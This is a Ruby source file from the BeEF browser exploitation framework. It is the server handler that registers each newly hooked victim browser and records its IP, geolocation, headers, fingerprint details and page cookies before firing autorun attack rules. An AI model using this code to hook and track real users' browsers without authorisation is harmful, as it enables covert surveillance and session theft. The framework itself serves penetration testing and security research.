#
# Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module Handlers
      # @note Retrieves information about the browser (type, version, plugins etc.)
      class BrowserDetails
        @data = {}

        HB = BeEF::Core::Models::HookedBrowser
        BD = BeEF::Core::Models::BrowserDetails

        def initialize(data)
          @data = data
          setup
        end

        def err_msg(error)
          print_error "[Browser Details] #{error}"
        end

        def setup
          print_debug '[INIT] Processing Browser Details...'
          config = BeEF::Core::Configuration.instance

          # validate hook session value
          session_id = get_param(@data, 'beefhook')

          print_debug "[INIT] Processing Browser Details for session #{session_id}"
          unless BeEF::Filters.is_valid_hook_session_id?(session_id)
            err_msg 'session id is invalid'
            return
          end

          hooked_browser = HB.where(session: session_id).first
          return unless hooked_browser.nil? # browser is already registered with framework

          # create the structure representing the hooked browser
          zombie = BeEF::Core::Models::HookedBrowser.new(ip: @data['request'].ip, session: session_id)
          zombie.firstseen = Time.new.to_i

          # hooked window host name
          log_zombie_port = 0
          if !@data['results']['browser.window.hostname'].nil? && BeEF::Filters.is_valid_hostname?(@data['results']['browser.window.hostname'])
            log_zombie_domain = @data['results']['browser.window.hostname']
          elsif !@data['request'].referer.nil? and !@data['request'].referer.empty?
            referer = @data['request'].referer
            log_zombie_port = if referer.start_with?('https://')
                                443
                              else
                                80
                              end
            log_zombie_domain = referer.gsub('http://', '').gsub('https://', '').split('/')[0]
          else
            log_zombie_domain = 'unknown' # Probably local file open
          end

          # hooked window host port
          if @data['results']['browser.window.hostport'].nil? || !BeEF::Filters.is_valid_port?(@data['results']['browser.window.hostport'].to_s)
            log_zombie_domain_parts = log_zombie_domain.split(':')
            log_zombie_port = log_zombie_domain_parts[1].to_i if log_zombie_domain_parts.length > 1
          else
            log_zombie_port = @data['results']['browser.window.hostport']
          end

          zombie.domain = log_zombie_domain
          zombie.port = log_zombie_port

          # Parse http_headers. Unfortunately Rack doesn't provide a util-method to get them :(
          @http_headers = {}
          http_header = @data['request'].env.select { |k, _v| k.to_s.start_with? 'HTTP_' }
                                        .each do |key, value|
            @http_headers[key.sub(/^HTTP_/, '')] = value.force_encoding('UTF-8')
          end
          zombie.httpheaders = @http_headers.to_json
          zombie.save!
          # print_debug "[INIT] HTTP Headers: #{zombie.httpheaders}"

          # add a log entry for the newly hooked browser
          BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}:#{log_zombie_port}", zombie.id.to_s)

          # get and store browser name
          browser_name = get_param(@data['results'], 'browser.name')
          if BeEF::Filters.is_valid_browsername?(browser_name)
            BD.set(session_id, 'browser.name', browser_name)

            # lookup and store browser friendly name
            browser_friendly_name = BeEF::Core::Constants::Browsers.friendly_name(browser_name)
            BD.set(session_id, 'browser.name.friendly', browser_friendly_name)
          else
            err_msg "Invalid browser name returned from the hook browser's initial connection."
            browser_name = 'Unknown'
          end

          if BeEF::Filters.is_valid_ip?(zombie.ip)
            BD.set(session_id, 'network.ipaddress', zombie.ip)
          else
            err_msg "Invalid IP address returned from the hook browser's initial connection."
          end

          # lookup zombie host name
          if config.get('beef.dns_hostname_lookup')
            begin
              host_name = Resolv.getname(zombie.ip).to_s
              BD.set(session_id, 'host.name', host_name) if BeEF::Filters.is_valid_hostname?(host_name)
            rescue StandardError
              print_debug "[INIT] Reverse lookup failed - No results for IP address '#{zombie.ip}'"
            end
          end

          # geolocation
          BD.set(session_id, 'location.city', 'Unknown')
          BD.set(session_id, 'location.country', 'Unknown')
          if BeEF::Core::GeoIp.instance.enabled?
            geoip = BeEF::Core::GeoIp.instance.lookup(zombie.ip)
            if geoip.nil?
              print_debug "[INIT] Geolocation failed - No results for IP address '#{zombie.ip}'"
            else
              # print_debug "[INIT] Geolocation results: #{geoip}"
              BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} is connecting from: #{geoip}", zombie.id.to_s)
              BD.set(
                session_id,
                'location.city',
                (begin
                  geoip['city']['names']['en']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.country',
                (begin
                  geoip['country']['names']['en']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.country.isocode',
                (begin
                  geoip['country']['iso_code']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.country.registered_country',
                (begin
                  geoip['registered_country']['names']['en']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.country.registered_country.isocode',
                (begin
                  geoip['registered_country']['iso_code']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.continent',
                (begin
                  geoip['continent']['names']['en']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.continent.code',
                (begin
                  geoip['continent']['code']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.latitude',
                (begin
                  geoip['location']['latitude']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.longitude',
                (begin
                  geoip['location']['longitude']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
              BD.set(
                session_id,
                'location.timezone',
                (begin
                  geoip['location']['time_zone']
                rescue StandardError
                  'Unknown'
                end).to_s
              )
            end
          end

          # detect browser proxy
          using_proxy = false
          %w[
            CLIENT_IP
            FORWARDED_FOR
            FORWARDED
            FORWARDED_FOR_IP
            PROXY_CONNECTION
            PROXY_AUTHENTICATE
            X_FORWARDED
            X_FORWARDED_FOR
            VIA
          ].each do |header|
            unless JSON.parse(zombie.httpheaders)[header].nil?
              using_proxy = true
              break
            end
          end

          # retrieve proxy client IP
          proxy_clients = []
          %w[
            CLIENT_IP
            FORWARDED_FOR
            FORWARDED
            FORWARDED_FOR_IP
            X_FORWARDED
            X_FORWARDED_FOR
          ].each do |header|
            val = JSON.parse(zombie.httpheaders)[header]
            unless val.nil?
              val.to_s.split(',').each do |ip|
                proxy_clients << ip.strip if BeEF::Filters.is_valid_ip?(ip.strip)
              end
            end
          end

          # retrieve proxy server
          proxy_server = JSON.parse(zombie.httpheaders)['VIA'] unless JSON.parse(zombie.httpheaders)['VIA'].nil?
          proxy_server = nil unless proxy_server.nil? || BeEF::Filters.has_valid_browser_details_chars?(proxy_server)

          # store and log proxy details
          if using_proxy == true
            BD.set(session_id, 'network.proxy', 'Yes')
            proxy_log_string = "#{zombie.ip} is using a proxy"
            unless proxy_clients.empty?
              BD.set(session_id, 'network.proxy.client', proxy_clients.sort.uniq.join(',').to_s)
              proxy_log_string += " [client: #{proxy_clients.sort.uniq.join(',')}]"
            end
            unless proxy_server.nil?
              BD.set(session_id, 'network.proxy.server', proxy_server.to_s)
              proxy_log_string += " [server: #{proxy_server}]"
              if config.get('beef.extension.network.enable') == true && (proxy_server =~ /^([\d.]+):(\d+)$/)
                print_debug("Hooked browser [id:#{zombie.id}] is using a proxy [ip: #{Regexp.last_match(1)}]")
                BeEF::Core::Models::NetworkHost.create(hooked_browser_id: session_id, ip: Regexp.last_match(1), type: 'Proxy')
              end
            end
            BeEF::Core::Logger.instance.register('Zombie', proxy_log_string.to_s, zombie.id.to_s)
          end

          # get and store browser version
          browser_version = get_param(@data['results'], 'browser.version')
          if BeEF::Filters.is_valid_browserversion?(browser_version)
            BD.set(session_id, 'browser.version', browser_version)
          else
            err_msg "Invalid browser version returned from the hook browser's initial connection."
            browser_version = 'Unknown'
          end

          # get and store browser string
          browser_string = get_param(@data['results'], 'browser.name.reported')
          if BeEF::Filters.is_valid_browserstring?(browser_string)
            BD.set(session_id, 'browser.name.reported', browser_string)
          else
            err_msg "Invalid value for 'browser.name.reported' returned from the hook browser's initial connection."
          end

          # get and store browser engine
          browser_engine = get_param(@data['results'], 'browser.engine')
          if BeEF::Filters.is_valid_browserstring?(browser_engine)
            BD.set(session_id, 'browser.engine', browser_engine)
          else
            err_msg "Invalid value for 'browser.engine' returned from the hook browser's initial connection."
          end

          # get and store browser language
          browser_lang = get_param(@data['results'], 'browser.language')
          if BeEF::Filters.has_valid_browser_details_chars?(browser_lang)
            BD.set(session_id, 'browser.language', browser_lang)
          else
            err_msg "Invalid browser language returned from the hook browser's initial connection."
          end

          # get and store the cookies
          cookies = get_param(@data['results'], 'browser.window.cookies')
          if BeEF::Filters.is_valid_cookies?(cookies)
            BD.set(session_id, 'browser.window.cookies', cookies)
          else
            err_msg "Invalid cookies returned from the hook browser's initial connection."
          end

          # get and store the OS name
          os_name = get_param(@data['results'], 'host.os.name')
          if BeEF::Filters.is_valid_osname?(os_name)
            BD.set(session_id, 'host.os.name', os_name)
          else
            err_msg "Invalid operating system name returned from the hook browser's initial connection."
            os_name = 'Unknown'
          end

          # get and store the OS family
          os_family = get_param(@data['results'], 'host.os.family')
          if BeEF::Filters.is_valid_osname?(os_family)
            BD.set(session_id, 'host.os.family', os_family)
          else
            err_msg "Invalid value for 'host.os.family' returned from the hook browser's initial connection."
          end

          # get and store the OS version
          # - without checks as it can be very different, for instance on linux/bsd)
          os_version = get_param(@data['results'], 'host.os.version')
          if BeEF::Filters.has_valid_browser_details_chars?(os_version)
            BD.set(session_id, 'host.os.version', os_version)
          else
            err_msg "Invalid operating system version returned from the hook browser's initial connection."
            os_version = 'Unknown'
          end

          # get and store the OS arch
          os_arch = get_param(@data['results'], 'host.os.arch')
          if BeEF::Filters.has_valid_browser_details_chars?(os_arch)
            BD.set(session_id, 'host.os.arch', os_arch)
          else
            err_msg "Invalid operating system architecture returned from the hook browser's initial connection."
          end

          # get and store default browser
          default_browser = get_param(@data['results'], 'host.software.defaultbrowser')
          if BeEF::Filters.has_valid_browser_details_chars?(default_browser)
            BD.set(session_id, 'host.software.defaultbrowser', default_browser)
          else
            err_msg "Invalid default browser returned from the hook browser's initial connection."
          end

          # get and store the hardware type
          hw_type = get_param(@data['results'], 'hardware.type')
          if BeEF::Filters.is_valid_hwname?(hw_type)
            BD.set(session_id, 'hardware.type', hw_type)
          else
            err_msg "Invalid value for 'hardware.type' returned from the hook browser's initial connection."
          end

          # get and store the date
          date_stamp = get_param(@data['results'], 'browser.date.datestamp')
          if BeEF::Filters.is_valid_date_stamp?(date_stamp)
            BD.set(session_id, 'browser.date.datestamp', date_stamp)
          else
            err_msg "Invalid date returned from the hook browser's initial connection."
          end

          # get and store page title
          page_title = get_param(@data['results'], 'browser.window.title')
          if BeEF::Filters.is_valid_pagetitle?(page_title)
            BD.set(session_id, 'browser.window.title', page_title)
          else
            err_msg "Invalid value for 'browser.window.title' returned from the hook browser's initial connection."
          end

          # get and store page origin
          origin = get_param(@data['results'], 'browser.window.origin')
          if BeEF::Filters.is_valid_url?(origin)
            BD.set(session_id, 'browser.window.origin', origin)
          else
            err_msg "Invalid value for 'browser.window.uri' returned from the hook browser's initial connection."
          end

          # get and store page uri
          page_uri = get_param(@data['results'], 'browser.window.uri')
          if BeEF::Filters.is_valid_url?(page_uri)
            BD.set(session_id, 'browser.window.uri', page_uri)
          else
            err_msg "Invalid value for 'browser.window.uri' returned from the hook browser's initial connection."
          end

          # get and store the page referrer
          page_referrer = get_param(@data['results'], 'browser.window.referrer')
          if BeEF::Filters.is_valid_pagereferrer?(page_referrer)
            BD.set(session_id, 'browser.window.referrer', page_referrer)
          else
            err_msg "Invalid value for 'browser.window.referrer' returned from the hook browser's initial connection."
          end

          # get and store hooked window host port
          host_name = get_param(@data['results'], 'browser.window.hostname')
          if BeEF::Filters.is_valid_hostname?(host_name)
            BD.set(session_id, 'browser.window.hostname', host_name)
          else
            err_msg "Invalid valid for 'browser.window.hostname' returned from the hook browser's initial connection."
          end

          # get and store hooked window host port
          host_port = get_param(@data['results'], 'browser.window.hostport')
          if BeEF::Filters.is_valid_port?(host_port)
            BD.set(session_id, 'browser.window.hostport', host_port)
          else
            err_msg "Invalid valid for 'browser.window.hostport' returned from the hook browser's initial connection."
          end

          # get and store the browser plugins
          browser_plugins = get_param(@data['results'], 'browser.plugins')
          if BeEF::Filters.is_valid_browser_plugins?(browser_plugins)
            BD.set(session_id, 'browser.plugins', browser_plugins)
          elsif browser_plugins == "[]"
            err_msg "No browser plugins detected."
          else
            err_msg "Invalid browser plugins returned from the hook browser's initial connection."
          end

          # get and store the system platform
          system_platform = get_param(@data['results'], 'browser.platform')
          if BeEF::Filters.is_valid_system_platform?(system_platform)
            BD.set(session_id, 'browser.platform', system_platform)
          else
            err_msg "Invalid browser platform returned from the hook browser's initial connection."
          end

          # get and store the zombie screen color depth
          screen_colordepth = get_param(@data['results'], 'hardware.screen.colordepth')
          if BeEF::Filters.nums_only?(screen_colordepth)
            BD.set(session_id, 'hardware.screen.colordepth', screen_colordepth)
          else
            err_msg "Invalid value for 'hardware.screen.colordepth' returned from the hook browser's initial connection."
          end

          # get and store the zombie screen width
          screen_size_width = get_param(@data['results'], 'hardware.screen.size.width')
          if BeEF::Filters.nums_only?(screen_size_width)
            BD.set(session_id, 'hardware.screen.size.width', screen_size_width)
          else
            err_msg "Invalid value for 'hardware.screen.size.width' returned from the hook browser's initial connection."
          end

          # get and store the zombie screen height
          screen_size_height = get_param(@data['results'], 'hardware.screen.size.height')
          if BeEF::Filters.nums_only?(screen_size_height)
            BD.set(session_id, 'hardware.screen.size.height', screen_size_height)
          else
            err_msg "Invalid value for 'hardware.screen.size.height' returned from the hook browser's initial connection."
          end

          # get and store the window height
          window_height = get_param(@data['results'], 'browser.window.size.height')
          if BeEF::Filters.nums_only?(window_height)
            BD.set(session_id, 'browser.window.size.height', window_height)
          else
            err_msg "Invalid value for 'browser.window.size.height' returned from the hook browser's initial connection."
          end

          # get and store the window width
          window_width = get_param(@data['results'], 'browser.window.size.width')
          if BeEF::Filters.nums_only?(window_width)
            BD.set(session_id, 'browser.window.size.width', window_width)
          else
            err_msg "Invalid value for 'browser.window.size.width' returned from the hook browser's initial connection."
          end

          # store and log IP details of host
          print_debug("Hooked browser [id:#{zombie.id}] has IP [ip: #{zombie.ip}]")

          if !os_name.nil? and !os_version.nil?
            BeEF::Core::Models::NetworkHost.create(hooked_browser: zombie, ip: zombie.ip, ntype: 'Host', os: os_name + '-' + os_version)
          elsif !os_name.nil?
            BeEF::Core::Models::NetworkHost.create(hooked_browser: zombie, ip: zombie.ip, ntype: 'Host', os: os_name)
          else
            BeEF::Core::Models::NetworkHost.create(hooked_browser: zombie, ip: zombie.ip, ntype: 'Host')
          end

          # get and store the yes|no value for browser capabilities
          capabilities = [
            'browser.capabilities.vbscript',
            # 'browser.capabilities.java',
            'browser.capabilities.flash',
            'browser.capabilities.silverlight',
            'browser.capabilities.phonegap',
            'browser.capabilities.googlegears',
            'browser.capabilities.activex',
            'browser.capabilities.quicktime',
            'browser.capabilities.realplayer',
            'browser.capabilities.wmp',
            'browser.capabilities.vlc',
            'browser.capabilities.webworker',
            'browser.capabilities.websocket',
            'browser.capabilities.webgl',
            'browser.capabilities.webrtc'
          ]
          capabilities.each do |k|
            v = get_param(@data['results'], k)
            if BeEF::Filters.is_valid_yes_no?(v)
              BD.set(session_id, k, v)
            else
              err_msg "Invalid value for #{k} returned from the hook browser's initial connection."
            end
          end

          # get and store the value for hardware.memory
          memory = get_param(@data['results'], 'hardware.memory')
          if BeEF::Filters.is_valid_memory?(memory)
            BD.set(session_id, 'hardware.memory', memory)
          else
            err_msg "Invalid value for 'hardware.memory' returned from the hook browser's initial connection."
          end

          # get and store the value for hardware.gpu
          gpu = get_param(@data['results'], 'hardware.gpu')
          if BeEF::Filters.is_valid_gpu?(gpu)
            BD.set(session_id, 'hardware.gpu', gpu)
          else
            err_msg "Invalid value for 'hardware.gpu' returned from the hook browser's initial connection."
          end

          # get and store the value for hardware.gpu.vendor
          gpu_vendor = get_param(@data['results'], 'hardware.gpu.vendor')
          if BeEF::Filters.is_valid_gpu?(gpu_vendor)
            BD.set(session_id, 'hardware.gpu.vendor', gpu_vendor)
          else
            err_msg "Invalid value for 'hardware.gpu.vendor' returned from the hook browser's initial connection."
          end

          # get and store the value for hardware.cpu.arch
          cpu_arch = get_param(@data['results'], 'hardware.cpu.arch')
          if BeEF::Filters.is_valid_cpu?(cpu_arch)
            BD.set(session_id, 'hardware.cpu.arch', cpu_arch)
          else
            err_msg "Invalid value for 'hardware.cpu.arch' returned from the hook browser's initial connection."
          end

          # get and store the value for hardware.cpu.cores
          cpu_cores = get_param(@data['results'], 'hardware.cpu.cores')
          if BeEF::Filters.alphanums_only?(cpu_cores)
            BD.set(session_id, 'hardware.cpu.cores', cpu_cores)
          else
            err_msg "Invalid value for 'hardware.cpu.cores' returned from the hook browser's initial connection."
          end

          # get and store the value for hardware.battery.level
          battery_level = get_param(@data['results'], 'hardware.battery.level')
          if battery_level == 'unknown' || battery_level =~ /\A[\d.]+%\z/
            BD.set(session_id, 'hardware.battery.level', battery_level)
          else
            err_msg "Invalid value for 'hardware.battery.level' returned from the hook browser's initial connection."
          end

          # get and store the value for hardware.screen.touchenabled
          touch_enabled = get_param(@data['results'], 'hardware.screen.touchenabled')
          if BeEF::Filters.is_valid_yes_no?(touch_enabled)
            BD.set(session_id, 'hardware.screen.touchenabled', touch_enabled)
          else
            err_msg "Invalid value for hardware.screen.touchenabled returned from the hook browser's initial connection."
          end

          # log a few info of newly hooked zombie in the console
          print_info "New Hooked Browser [id:#{zombie.id}, ip:#{zombie.ip}, browser:#{browser_name}-#{browser_version}, os:#{os_name}-#{os_version}], hooked origin [#{log_zombie_domain}:#{log_zombie_port}]"

          # add localhost as network host
          if config.get('beef.extension.network.enable')
            print_debug('Hooked browser has network interface 127.0.0.1')
            BeEF::Core::Models::NetworkHost.create(hooked_browser_id: session_id, ip: '127.0.0.1', hostname: 'localhost',
                                                   os: BeEF::Core::Models::BrowserDetails.get(session_id, 'host.os.name'))
          end

          # check if any ARE rules shall be triggered only if the channel is != WebSockets (XHR). If the channel
          # is WebSockets, then ARe rules are triggered after channel is established.
          BeEF::Core::AutorunEngine::Engine.instance.find_and_run_all_matching_rules_for_zombie(zombie.id) unless config.get('beef.http.websocket.enable')
        end

        def get_param(query, key)
          (query.instance_of?(Hash) and query.has_key?(key)) ? query[key].to_s : nil
        end
      end
    end
  end
end
